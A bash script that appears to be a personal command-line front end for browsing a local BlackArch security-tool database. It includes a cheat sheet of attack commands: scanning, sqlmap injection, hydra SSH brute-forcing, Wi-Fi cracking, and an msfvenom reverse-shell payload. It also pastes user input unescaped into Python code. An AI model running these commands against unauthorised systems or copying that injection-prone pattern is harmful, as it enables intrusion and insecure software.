#!/bin/bash
# BlackArch CLI - Quick command line interface

# Colors
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Banner
show_banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════════════════════════╗"
    echo "║    ███████╗██╗  ██╗ ██████╗ ██████╗ ███╗   ██╗███████╗    ║"
    echo "║    ██╔════╝██║  ██║██╔═══██╗██╔══██╗████╗  ██║██╔════╝    ║"
    echo "║    ███████╗███████║██║   ██║██████╔╝██╔██╗ ██║███████╗    ║"
    echo "║    ╚════██║██╔══██║██║   ██║██╔══██╗██║╚██╗██║╚════██║    ║"
    echo "║    ███████║██║  ██║╚██████╔╝██║  ██║██║ ╚████║███████║    ║"
    echo "║    ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝    ║"
    echo "║                   TOOLS CLI v1.0                           ║"
    echo "╚═══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Show categories
show_categories() {
    python3 << EOF
import json
with open("/run/media/phoenix0/Ventoy/New Folder/blackarch_full_db.json") as f:
    data = json.load(f)
    cats = sorted(data['categories'].items(), key=lambda x: -len(x[1]))
    print("\n${GREEN}Available Categories:${NC}")
    for cat, tools in cats[:20]:
        print(f"  ${YELLOW}{cat.upper():15}${NC} {len(tools)} tools")
    if len(cats) > 20:
        print(f"\n  ... and {len(cats)-20} more categories")
EOF
}

# Search tools
search_tools() {
    local query="$1"
    if [ -z "$query" ]; then
        echo "Usage: blackarch search <query>"
        return
    fi
    python3 << EOF
import json
import sys
query = "$query".lower()
with open("/run/media/phoenix0/Ventoy/New Folder/blackarch_full_db.json") as f:
    data = json.load(f)
    results = []
    for cat, tools in data['categories'].items():
        for t in tools:
            if query in t['name'].lower() or query in t['description'].lower():
                results.append((cat, t['name'], t['description']))
    for cat, name, desc in results[:20]:
        print(f"[{cat:12}] ${GREEN}{name}${NC}")
        print(f"  {desc[:70]}...")
    if not results:
        print("No results found")
EOF
}

# Show tool details
show_tool() {
    local name="$1"
    if [ -z "$name" ]; then
        echo "Usage: blackarch tool <name>"
        return
    fi
    python3 << EOF
import json
import sys
name = "$name".lower()
with open("/run/media/phoenix0/Ventoy/New Folder/blackarch_full_db.json") as f:
    data = json.load(f)
    for cat, tools in data['categories'].items():
        for t in tools:
            if name in t['name'].lower():
                print(f"\n${GREEN}Name:${NC} {t['name']}")
                print(f"${GREEN}Version:${NC} {t['version']}")
                print(f"${GREEN}Category:${NC} {cat}")
                print(f"${GREEN}Description:${NC} {t['description']}")
                return
    print("Tool not found")
EOF
}

# Random tools
random_tools() {
    local count="${1:-5}"
    python3 << EOF
import json
import random
with open("/run/media/phoenix0/Ventoy/New Folder/blackarch_full_db.json") as f:
    data = json.load(f)
    all_tools = [(cat, t) for cat, tools in data['categories'].items() for t in tools]
    for cat, t in random.sample(all_tools, min($count, len(all_tools))):
        print(f"[{cat:12}] ${GREEN}{t['name']}${NC}")
        print(f"  {t['description'][:60]}...")
EOF
}

# Stats
show_stats() {
    python3 << EOF
import json
with open("/run/media/phoenix0/Ventoy/New Folder/blackarch_full_db.json") as f:
    data = json.load(f)
    total = sum(len(v) for v in data['categories'].values())
    cats = len(data['categories'])
    print(f"\n${GREEN}📊 Database Statistics${NC}")
    print(f"  Total Tools: ${YELLOW}{total}${NC}")
    print(f"  Categories: ${YELLOW}{cats}${NC}")
    print(f"\n${GREEN}Top 10 Categories:${NC}")
    for cat, tools in sorted(data['categories'].items(), key=lambda x: -len(x[1]))[:10]:
        bar = "█" * (len(tools) // 20)
        print(f"  {cat.upper():15} {bar} {len(tools)}")
EOF
}

# Cheat sheet
cheat_sheet() {
    local category="$1"
    if [ -z "$category" ]; then
        echo "Usage: blackarch cheat <category>"
        echo "Categories: scanner, webapp, exploitation, cracker, wireless, forensic, recon, mobile"
        return
    fi
    
    case "$category" in
        scanner)
            echo -e "${GREEN}NMAP Commands:${NC}"
            echo "  nmap -sV target.com"
            echo "  nmap -sC target.com"
            echo "  nmap -p- target.com"
            echo "  nmap -A target.com"
            echo -e "\n${GREEN}MASSCAN:${NC}"
            echo "  masscan -p1-65535 target.com --rate=10000"
            ;;
        webapp)
            echo -e "${GREEN}SQLMap:${NC}"
            echo "  sqlmap -u 'http://target.com/?id=1' --batch"
            echo -e "\n${GREEN}DIRB:${NC}"
            echo "  dirb http://target.com"
            echo -e "\n${GREEN}NIKTO:${NC}"
            echo "  nikto -h target.com"
            ;;
        exploitation)
            echo -e "${GREEN}MSFVENOM:${NC}"
            echo "  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf"
            echo -e "\n${GREEN}SEARCHSPLOIT:${NC}"
            echo "  searchsploit keyword"
            ;;
        cracker)
            echo -e "${GREEN}HASHCAT:${NC}"
            echo "  hashcat -m 0 -a 0 hash.txt wordlist.txt"
            echo -e "\n${GREEN}HYDRA:${NC}"
            echo "  hydra -l admin -P passwords.txt ssh://target.com"
            ;;
        wireless)
            echo -e "${GREEN}AIRCRACK:${NC}"
            echo "  airmon-ng start wlan0"
            echo "  airodump-ng wlan0mon"
            echo "  aircrack-ng capture.cap -w wordlist.txt"
            ;;
        *)
            echo "Available cheat sheets: scanner, webapp, exploitation, cracker, wireless"
            ;;
    esac
}

# Help
show_help() {
    echo -e "${CYAN}BlackArch Tools CLI${NC}"
    echo ""
    echo -e "${GREEN}Usage:${NC} blackarch <command> [options]"
    echo ""
    echo -e "${GREEN}Commands:${NC}"
    echo "  list              Show all categories"
    echo "  search <query>    Search for tools"
    echo "  tool <name>       Show tool details"
    echo "  random [n]        Get random tools (default: 5)"
    echo "  stats             Show database statistics"
    echo "  cheat <category>  Show command cheat sheet"
    echo "  web               Open web interface"
    echo "  mcp               Start MCP server"
    echo "  help              Show this help"
    echo ""
    echo -e "${GREEN}Examples:${NC}"
    echo "  blackarch list"
    echo "  blackarch search nmap"
    echo "  blackarch tool sqlmap"
    echo "  blackarch cheat scanner"
}

# Main
show_banner

case "$1" in
    list|categories) show_categories ;;
    search) search_tools "$2" ;;
    tool|info) show_tool "$2" ;;
    random) random_tools "$2" ;;
    stats) show_stats ;;
    cheat|commands) cheat_sheet "$2" ;;
    web) python3 /run/media/phoenix0/Ventoy/New\ Folder/blackarch_web.py ;;
    mcp) python3 /run/media/phoenix0/Ventoy/New\ Folder/blackarch_mcp_v2.py ;;
    help|--help|-h) show_help ;;
    *) show_help ;;
esac